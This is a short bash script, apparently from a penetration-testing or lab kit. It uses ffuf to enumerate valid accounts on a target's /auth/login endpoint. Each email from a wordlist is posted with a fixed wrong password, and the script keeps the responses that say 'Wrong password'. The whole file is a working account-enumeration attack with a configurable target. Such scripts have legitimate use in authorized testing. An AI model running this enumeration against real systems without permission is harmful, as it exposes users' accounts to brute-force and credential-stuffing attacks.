#!/bin/bash

# source config from parent directory
source $(dirname "$0")/../config.sh

# will show the existing users from users.txt
echo "Existing users from users.txt (we match regex with the response body):"
ffuf -s -w users.txt \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email": "FUZZ", "password": "ThisIsNotThePassword"}' \
  -u "$TARGET_IP/auth/login" \
  -mr "Wrong password"
